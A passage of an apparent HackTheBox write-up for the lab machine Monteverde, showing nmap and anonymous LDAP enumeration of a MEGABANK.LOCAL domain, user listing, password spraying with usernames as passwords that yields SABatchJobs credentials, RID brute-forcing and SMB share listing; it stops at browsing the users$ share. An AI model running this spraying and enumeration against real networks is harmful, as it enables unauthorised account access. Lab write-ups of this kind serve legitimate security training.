# CTF Penetration Testing

## Platform: HackTheBox

### Machine: [Monteverde](https://www.hackthebox.com/machines/Monteverde)

<img src="https://labs.hackthebox.com/storage/avatars/00ceebe5dbef1106ce4390365cd787b4.png" alt="Monteverde Machine Logo" width="150"/>

- Machine type: <img src="https://hackmyvm.eu/img/windows.png" alt="Windows" width="17"/> Windows
- Machine difficulty: 🟨 Medium (<span style="color:#f4b03b;">4.7</span>)

> Monteverde is a Medium Windows machine that features Azure AD Connect. The domain is enumerated and a user list is created. Through password spraying, the `SABatchJobs` service account is found to have the username as a password. Using this service account, it is possible to enumerate SMB Shares on the system, and the `$users` share is found to be world-readable. An XML file used for an Azure AD account is found within a user folder and contains a password. Due to password reuse, we can connect to the domain controller as `mhope` using WinRM. Enumeration shows that `Azure AD Connect` is installed. It is possible to extract the credentials for the account that replicates the directory changes to Azure (in this case the default domain administrator).

#### Skills Required

- Basic Windows Enumeration
- Basic Active Directory Enumeration

#### Skills learned

- Password Spraying
- [Using `sqlcmd`](https://learn.microsoft.com/en-us/sql/tools/sqlcmd/sqlcmd-utility?view=sql-server-ver16&tabs=go%2Cwindows&pivots=cs1-bash)
- [Azure AD Connect Password Extraction](https://blog.xpnsec.com/azuread-connect-for-redteam/)

#### Tools Used

Linux:
- evil-winrm
- ldapsearch
- netexec
- nmap
- smbclient
- windapsearch

Windows:
- azuread_decrypt.ps1
- netstat.exe
- sqlcmd.exe
- winPEAS.exe

#### Machine Writeup

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`ifconfig tun0`:
```
tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.14.22 📌 netmask 255.255.254.0  destination 10.10.14.22
        inet6 dead:beef:2::1014  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::f20:5e27:988e:e97a  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 7671  bytes 5736922 (5.4 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5722  bytes 1087720 (1.0 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`fping 10.10.10.172`:
```
10.10.10.172 is alive
```

`sudo nmap -Pn -sSV -p- -T5 10.10.10.172`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-08 14:55 CET
Nmap scan report for 10.10.10.172
Host is up (0.060s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-08 14:56:44Z) 🔍
135/tcp   open  msrpc         Microsoft Windows RPC 🔍
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn 🔍
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name) 🔍
445/tcp   open  microsoft-ds? 🔍
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped 🔍
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 🔍
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
49749/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows 📌

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 156.39 seconds
```

`sudo nmap -Pn -sS --script=ldap-rootdse -p389 10.10.10.172`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-08 16:10 CET
Nmap scan report for 10.10.10.172
Host is up (0.064s latency).

PORT    STATE SERVICE
389/tcp open  ldap
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       domainFunctionality: 7
|       forestFunctionality: 7
|       domainControllerFunctionality: 7
|       rootDomainNamingContext: DC=MEGABANK,DC=LOCAL
|       ldapServiceName: MEGABANK.LOCAL:monteverde$@MEGABANK.LOCAL
|       isGlobalCatalogReady: TRUE
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxPercentDirSyncRequests
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxBatchReturnMessages
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxDirSyncDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: MaxValRangeTransitive
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedControl: 1.2.840.113556.1.4.2090
|       supportedControl: 1.2.840.113556.1.4.2205
|       supportedControl: 1.2.840.113556.1.4.2204
|       supportedControl: 1.2.840.113556.1.4.2206
|       supportedControl: 1.2.840.113556.1.4.2211
|       supportedControl: 1.2.840.113556.1.4.2239
|       supportedControl: 1.2.840.113556.1.4.2255
|       supportedControl: 1.2.840.113556.1.4.2256
|       supportedControl: 1.2.840.113556.1.4.2309
|       supportedControl: 1.2.840.113556.1.4.2330
|       supportedControl: 1.2.840.113556.1.4.2354
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       supportedCapabilities: 1.2.840.113556.1.4.2237
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
|       serverName: CN=MONTEVERDE,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=MEGABANK,DC=LOCAL
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
|       namingContexts: DC=MEGABANK,DC=LOCAL
|       namingContexts: CN=Configuration,DC=MEGABANK,DC=LOCAL
|       namingContexts: CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
|       namingContexts: DC=DomainDnsZones,DC=MEGABANK,DC=LOCAL
|       namingContexts: DC=ForestDnsZones,DC=MEGABANK,DC=LOCAL
|       isSynchronized: TRUE
|       highestCommittedUSN: 78266
|       dsServiceName: CN=NTDS Settings,CN=MONTEVERDE,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=MEGABANK,DC=LOCAL
|       dnsHostName: MONTEVERDE.MEGABANK.LOCAL 📌
|       defaultNamingContext: DC=MEGABANK,DC=LOCAL
|       currentTime: 20241108160958.0Z
|_      configurationNamingContext: CN=Configuration,DC=MEGABANK,DC=LOCAL
Service Info: Host: MONTEVERDE; OS: Windows

Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds
```

`echo -e '10.10.10.172\tmonteverde.megabank.local megabank.local megabank' | sudo tee -a /etc/hosts`:
```
10.10.10.172    monteverde.megabank.local megabank.local megabank
```

A good first step is to check for LDAP anonymous binds or SMB null sessions, as this would allow us to enumerate the domain without credentials.

`ldapsearch -x -H ldap://10.10.10.172/ -s 'base' 'namingContexts'`:
```
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingContexts 
#

#
dn:
namingContexts: DC=MEGABANK,DC=LOCAL
namingContexts: CN=Configuration,DC=MEGABANK,DC=LOCAL
namingContexts: CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
namingContexts: DC=DomainDnsZones,DC=MEGABANK,DC=LOCAL
namingContexts: DC=ForestDnsZones,DC=MEGABANK,DC=LOCAL

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

`ldapsearch -x -H ldap://10.10.10.172/ -b "DC=megabank,DC=local" '(objectClass=*)'`:
```
[...]

# Ray O'Leary, Toronto, MegaBank Users, MEGABANK.LOCAL
dn: CN=Ray O'Leary,OU=Toronto,OU=MegaBank Users,DC=MEGABANK,DC=LOCAL
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Ray O'Leary
sn: O'Leary
givenName: Ray
distinguishedName: CN=Ray O'Leary,OU=Toronto,OU=MegaBank Users,DC=MEGABANK,DC=
 LOCAL
instanceType: 4
whenCreated: 20200103130805.0Z
whenChanged: 20200103134739.0Z
displayName: Ray O'Leary
uSNCreated: 41161
memberOf: CN=HelpDesk,OU=Groups,DC=MEGABANK,DC=LOCAL
uSNChanged: 41249
name: Ray O'Leary
objectGUID:: 3DFb4iTqDkqLISG92VNrHw==
userAccountControl: 66048
badPwdCount: 2
codePage: 0
countryCode: 0
homeDirectory: \\monteverde\users$\roleary
homeDrive: H:
badPasswordTime: 133755537695932711
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132225304858321672
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAcwNaF5NorjL0aY3UNgoAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: roleary
sAMAccountType: 805306368
userPrincipalName: roleary@MEGABANK.LOCAL
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
dSCorePropagationData: 20200103130805.0Z
dSCorePropagationData: 16010101000000.0Z
mS-DS-ConsistencyGuid:: 3DFb4iTqDkqLISG92VNrHw==

# Sally Morgan, New York, MegaBank Users, MEGABANK.LOCAL
dn: CN=Sally Morgan,OU=New York,OU=MegaBank Users,DC=MEGABANK,DC=LOCAL
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Sally Morgan
sn: Morgan
givenName: Sally
distinguishedName: CN=Sally Morgan,OU=New York,OU=MegaBank Users,DC=MEGABANK,D
 C=LOCAL
instanceType: 4
whenCreated: 20200103130921.0Z
whenChanged: 20200103134739.0Z
displayName: Sally Morgan
uSNCreated: 41178
memberOf: CN=Operations,OU=Groups,DC=MEGABANK,DC=LOCAL
uSNChanged: 41251
name: Sally Morgan
objectGUID:: F60h1VDDkkWl/C8e8bOXuQ==
userAccountControl: 66048
badPwdCount: 2
codePage: 0
countryCode: 0
homeDirectory: \\monteverde\users$\smorgan
homeDrive: H:
badPasswordTime: 133755537697182714
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132225305616290842
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAcwNaF5NorjL0aY3UNwoAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: smorgan
sAMAccountType: 805306368
userPrincipalName: smorgan@MEGABANK.LOCAL
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
dSCorePropagationData: 20200103130921.0Z
dSCorePropagationData: 16010101000000.0Z
mS-DS-ConsistencyGuid:: F60h1VDDkkWl/C8e8bOXuQ==

# search reference
ref: ldap://ForestDnsZones.MEGABANK.LOCAL/DC=ForestDnsZones,DC=MEGABANK,DC=LOC
 AL

# search reference
ref: ldap://DomainDnsZones.MEGABANK.LOCAL/DC=DomainDnsZones,DC=MEGABANK,DC=LOC
 AL

# search reference
ref: ldap://MEGABANK.LOCAL/CN=Configuration,DC=MEGABANK,DC=LOCAL

# search result
search: 2
result: 0 Success

# numResponses: 271
# numEntries: 267
# numReferences: 3
```

`windapsearch.py -d megabank.local --dc-ip 10.10.10.172`:
```
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 10.10.10.172
[+] Getting defaultNamingContext from Root DSE
[+]     Found: DC=MEGABANK,DC=LOCAL
[+] Attempting bind
[+]     ...success! Binded as:
[+]      None

[*] Bye!
```

`windapsearch.py -d megabank.local --dc-ip 10.10.10.172 --users`:
```
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 10.10.10.172
[+] Getting defaultNamingContext from Root DSE
[+]     Found: DC=MEGABANK,DC=LOCAL
[+] Attempting bind
[+]     ...success! Binded as: 
[+]      None

[+] Enumerating all AD users
[+]     Found 10 users: 

cn: Guest

cn: AAD_987d7f2f57d2

cn: Mike Hope
userPrincipalName: mhope@MEGABANK.LOCAL

cn: SABatchJobs
userPrincipalName: SABatchJobs@MEGABANK.LOCAL

cn: svc-ata
userPrincipalName: svc-ata@MEGABANK.LOCAL

cn: svc-bexec
userPrincipalName: svc-bexec@MEGABANK.LOCAL

cn: svc-netapp
userPrincipalName: svc-netapp@MEGABANK.LOCAL

cn: Dimitris Galanos
userPrincipalName: dgalanos@MEGABANK.LOCAL

cn: Ray O'Leary
userPrincipalName: roleary@MEGABANK.LOCAL

cn: Sally Morgan
userPrincipalName: smorgan@MEGABANK.LOCAL


[*] Bye!
```

`windapsearch.py -d megabank.local --dc-ip 10.10.10.172 -m 'Remote Management Users'`:
```
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 10.10.10.172
[+] Getting defaultNamingContext from Root DSE
[+]     Found: DC=MEGABANK,DC=LOCAL
[+] Attempting bind
[+]     ...success! Binded as: 
[+]      None
[+] Attempting to enumerate full DN for group: Remote Management Users
[+]      Using DN: CN=Remote Management Users,CN=Builtin,DC=MEGABANK,DC=LOCAL 📌

[+]      Found 1 members:

b'CN=Mike Hope,OU=London,OU=MegaBank Users,DC=MEGABANK,DC=LOCAL' 📌

[*] Bye!
```

`netexec smb 10.10.10.172`:
```
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
```

`netexec smb 10.10.10.172 -u '' -p ''`:
```
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\:
```

`netexec smb 10.10.10.172 -u '' -p '' --shares`:
```
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\: 
SMB         10.10.10.172    445    MONTEVERDE       [-] Error enumerating shares: STATUS_ACCESS_DENIED
```
❌

`netexec smb 10.10.10.172 -u 'guest' -p ''`:
```
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\guest: STATUS_ACCOUNT_DISABLED
```
❌

`netexec smb 10.10.10.172 -u '' -p '' --users`:
```
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\: 
SMB         10.10.10.172    445    MONTEVERDE       -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.10.10.172    445    MONTEVERDE       Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.10.10.172    445    MONTEVERDE       AAD_987d7f2f57d2              2020-01-02 22:53:24 0       Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE. 🔍
SMB         10.10.10.172    445    MONTEVERDE       mhope                         2020-01-02 23:40:05 0        
SMB         10.10.10.172    445    MONTEVERDE       SABatchJobs                   2020-01-03 12:48:46 0        
SMB         10.10.10.172    445    MONTEVERDE       svc-ata                       2020-01-03 12:58:31 0        
SMB         10.10.10.172    445    MONTEVERDE       svc-bexec                     2020-01-03 12:59:55 0        
SMB         10.10.10.172    445    MONTEVERDE       svc-netapp                    2020-01-03 13:01:42 0        
SMB         10.10.10.172    445    MONTEVERDE       dgalanos                      2020-01-03 13:06:10 0        
SMB         10.10.10.172    445    MONTEVERDE       roleary                       2020-01-03 13:08:05 0        
SMB         10.10.10.172    445    MONTEVERDE       smorgan                       2020-01-03 13:09:21 0        
SMB         10.10.10.172    445    MONTEVERDE       [*] Enumerated 10 local users: MEGABANK
```

`netexec smb 10.10.10.172 -u '' -p '' --rid-brute`:
```
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\: 
SMB         10.10.10.172    445    MONTEVERDE       [-] Error connecting: LSAD SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
```
❌

`netexec smb 10.10.10.172 -u '' -p '' --users | grep -v -F '[' | awk '{ print $5 }' | sed '1d' | tee ./domain_users.txt`:
```
Guest
AAD_987d7f2f57d2
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan
```

`netexec smb 10.10.10.172 -u '' -p '' --pass-pol`:
```
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\: 
SMB         10.10.10.172    445    MONTEVERDE       [+] Dumping password info for domain: MEGABANK
SMB         10.10.10.172    445    MONTEVERDE       Minimum password length: 7
SMB         10.10.10.172    445    MONTEVERDE       Password history length: 24
SMB         10.10.10.172    445    MONTEVERDE       Maximum password age: 41 days 23 hours 53 minutes 
SMB         10.10.10.172    445    MONTEVERDE       
SMB         10.10.10.172    445    MONTEVERDE       Password Complexity Flags: 000000 📌
SMB         10.10.10.172    445    MONTEVERDE           Domain Refuse Password Change: 0
SMB         10.10.10.172    445    MONTEVERDE           Domain Password Store Cleartext: 0
SMB         10.10.10.172    445    MONTEVERDE           Domain Password Lockout Admins: 0 📌
SMB         10.10.10.172    445    MONTEVERDE           Domain Password No Clear Change: 0
SMB         10.10.10.172    445    MONTEVERDE           Domain Password No Anon Change: 0
SMB         10.10.10.172    445    MONTEVERDE           Domain Password Complex: 0
SMB         10.10.10.172    445    MONTEVERDE       
SMB         10.10.10.172    445    MONTEVERDE       Minimum password age: 1 day 4 minutes 
SMB         10.10.10.172    445    MONTEVERDE       Reset Account Lockout Counter: 30 minutes 
SMB         10.10.10.172    445    MONTEVERDE       Locked Account Duration: 30 minutes 
SMB         10.10.10.172    445    MONTEVERDE       Account Lockout Threshold: None
SMB         10.10.10.172    445    MONTEVERDE       Forced Log off Time: Not Set
```

The password policy has a `lockoutThreshold` of 0, which means we can attempt an unlimited
number of passwords without locking the account out (although this is quite noisy).

`netexec smb 10.10.10.172 -u ./domain_users.txt -p ./domain_users.txt --no-bruteforce --continue-on-success`:
```
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:Guest STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 🔑
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-ata:svc-ata STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-bexec:svc-bexec STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-netapp:svc-netapp STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:dgalanos STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:roleary STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\smorgan:smorgan STATUS_LOGON_FAILURE 
```

`netexec smb 10.10.10.172 -u 'SABatchJobs' -p 'SABatchJobs' --rid-brute`:
```
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
SMB         10.10.10.172    445    MONTEVERDE       498: MEGABANK\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.10.172    445    MONTEVERDE       500: MEGABANK\Administrator (SidTypeUser)
SMB         10.10.10.172    445    MONTEVERDE       501: MEGABANK\Guest (SidTypeUser)
SMB         10.10.10.172    445    MONTEVERDE       502: MEGABANK\krbtgt (SidTypeUser)
SMB         10.10.10.172    445    MONTEVERDE       512: MEGABANK\Domain Admins (SidTypeGroup)
SMB         10.10.10.172    445    MONTEVERDE       513: MEGABANK\Domain Users (SidTypeGroup)
SMB         10.10.10.172    445    MONTEVERDE       514: MEGABANK\Domain Guests (SidTypeGroup)
SMB         10.10.10.172    445    MONTEVERDE       515: MEGABANK\Domain Computers (SidTypeGroup)
SMB         10.10.10.172    445    MONTEVERDE       516: MEGABANK\Domain Controllers (SidTypeGroup)
SMB         10.10.10.172    445    MONTEVERDE       517: MEGABANK\Cert Publishers (SidTypeAlias)
SMB         10.10.10.172    445    MONTEVERDE       518: MEGABANK\Schema Admins (SidTypeGroup)
SMB         10.10.10.172    445    MONTEVERDE       519: MEGABANK\Enterprise Admins (SidTypeGroup)
SMB         10.10.10.172    445    MONTEVERDE       520: MEGABANK\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.10.172    445    MONTEVERDE       521: MEGABANK\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.10.172    445    MONTEVERDE       522: MEGABANK\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.10.172    445    MONTEVERDE       525: MEGABANK\Protected Users (SidTypeGroup)
SMB         10.10.10.172    445    MONTEVERDE       526: MEGABANK\Key Admins (SidTypeGroup)
SMB         10.10.10.172    445    MONTEVERDE       527: MEGABANK\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.10.172    445    MONTEVERDE       553: MEGABANK\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.10.172    445    MONTEVERDE       571: MEGABANK\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.10.172    445    MONTEVERDE       572: MEGABANK\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.10.172    445    MONTEVERDE       1000: MEGABANK\MONTEVERDE$ (SidTypeUser)
SMB         10.10.10.172    445    MONTEVERDE       1101: MEGABANK\DnsAdmins (SidTypeAlias)
SMB         10.10.10.172    445    MONTEVERDE       1102: MEGABANK\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.10.172    445    MONTEVERDE       1103: MEGABANK\SQLServer2005SQLBrowserUser$MONTEVERDE (SidTypeAlias)
SMB         10.10.10.172    445    MONTEVERDE       1104: MEGABANK\AAD_987d7f2f57d2 (SidTypeUser)
SMB         10.10.10.172    445    MONTEVERDE       1105: MEGABANK\ADSyncAdmins (SidTypeAlias) 🔍
SMB         10.10.10.172    445    MONTEVERDE       1106: MEGABANK\ADSyncOperators (SidTypeAlias) 🔍
SMB         10.10.10.172    445    MONTEVERDE       1107: MEGABANK\ADSyncBrowse (SidTypeAlias) 🔍
SMB         10.10.10.172    445    MONTEVERDE       1108: MEGABANK\ADSyncPasswordSet (SidTypeAlias)
SMB         10.10.10.172    445    MONTEVERDE       1601: MEGABANK\mhope (SidTypeUser)
SMB         10.10.10.172    445    MONTEVERDE       2601: MEGABANK\Azure Admins (SidTypeGroup) 🔍
SMB         10.10.10.172    445    MONTEVERDE       2602: MEGABANK\SABatchJobs (SidTypeUser)
SMB         10.10.10.172    445    MONTEVERDE       2603: MEGABANK\svc-ata (SidTypeUser)
SMB         10.10.10.172    445    MONTEVERDE       2604: MEGABANK\svc-bexec (SidTypeUser)
SMB         10.10.10.172    445    MONTEVERDE       2605: MEGABANK\svc-netapp (SidTypeUser)
SMB         10.10.10.172    445    MONTEVERDE       2606: MEGABANK\File Server Admins (SidTypeGroup)
SMB         10.10.10.172    445    MONTEVERDE       2607: MEGABANK\Call Recording Admins (SidTypeGroup)
SMB         10.10.10.172    445    MONTEVERDE       2608: MEGABANK\Reception (SidTypeGroup)
SMB         10.10.10.172    445    MONTEVERDE       2609: MEGABANK\Operations (SidTypeGroup)
SMB         10.10.10.172    445    MONTEVERDE       2610: MEGABANK\Trading (SidTypeGroup)
SMB         10.10.10.172    445    MONTEVERDE       2611: MEGABANK\HelpDesk (SidTypeGroup)
SMB         10.10.10.172    445    MONTEVERDE       2612: MEGABANK\Developers (SidTypeGroup)
SMB         10.10.10.172    445    MONTEVERDE       2613: MEGABANK\dgalanos (SidTypeUser)
SMB         10.10.10.172    445    MONTEVERDE       2614: MEGABANK\roleary (SidTypeUser)
SMB         10.10.10.172    445    MONTEVERDE       2615: MEGABANK\smorgan (SidTypeUser)
```

`netexec smb 10.10.10.172 -u 'SABatchJobs' -p 'SABatchJobs' --shares`:
```
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
SMB         10.10.10.172    445    MONTEVERDE       [*] Enumerated shares
SMB         10.10.10.172    445    MONTEVERDE       Share           Permissions     Remark
SMB         10.10.10.172    445    MONTEVERDE       -----           -----------     ------
SMB         10.10.10.172    445    MONTEVERDE       ADMIN$                          Remote Admin
SMB         10.10.10.172    445    MONTEVERDE       azure_uploads   READ 🔍          
SMB         10.10.10.172    445    MONTEVERDE       C$                              Default share
SMB         10.10.10.172    445    MONTEVERDE       E$                              Default share
SMB         10.10.10.172    445    MONTEVERDE       IPC$            READ            Remote IPC
SMB         10.10.10.172    445    MONTEVERDE       NETLOGON        READ            Logon server share 
SMB         10.10.10.172    445    MONTEVERDE       SYSVOL          READ            Logon server share 
SMB         10.10.10.172    445    MONTEVERDE       users$          READ 🔍
```

`smbclient -U 'SABatchJobs' --password='SABatchJobs' //10.10.10.172/azure_uploads`:
```
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Jan  3 13:43:06 2020
  ..                                  D        0  Fri Jan  3 13:43:06 2020

                31999 blocks of size 4096. 28979 blocks available
```

`smbclient -U 'SABatchJobs' --password='SABatchJobs' '//10.10.10.172/users$'`:
```
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Jan  3 14:12:48 2020
